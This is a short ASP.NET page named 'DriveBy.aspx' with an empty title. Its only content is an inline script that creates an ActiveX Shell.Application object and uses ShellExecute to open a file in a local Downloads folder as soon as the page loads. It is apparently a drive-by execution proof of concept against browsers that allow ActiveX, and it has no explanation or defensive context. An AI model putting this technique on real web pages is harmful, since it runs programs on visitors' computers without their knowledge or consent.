<%@ Page Language="C#" AutoEventWireup="true" CodeFile="DriveBy.aspx.cs" Inherits="DriveBy" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>

       <script>

           var oShell = new ActiveXObject("Shell.Application");
           var commandtoRun = "C:\\Users\\haozhenxiao\\Downloads\\scripts.txt";
           oShell.ShellExecute(commandtoRun, "", "", "open", "1");



       </script>
    
    </div>
    </form>
</body>
</html>
